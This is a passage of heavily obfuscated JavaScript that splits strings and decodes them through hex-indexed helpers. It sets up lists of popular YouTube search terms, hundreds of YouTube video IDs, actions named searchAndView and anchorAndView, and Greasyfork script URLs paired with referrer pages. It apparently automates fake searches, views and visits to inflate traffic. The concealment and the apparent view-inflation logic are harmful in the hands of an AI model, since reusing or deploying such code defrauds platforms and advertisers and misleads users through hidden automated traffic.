'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + W(0x1b) + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + X(0xd, '#BDB') + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1520 + 0x7 * -0x19b + 0x4a1 * 0x7)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x216c + 0xb27 + -0xd * 0x36d)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x17bf + 0x177f + -0x2f3b);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    Y(0x15) + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    X(0x1c, 'ZiQ]') + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    W(0x18) + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + Y(0x4) + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + Y(0x2) + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + X(0x10, '!Uq2') + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
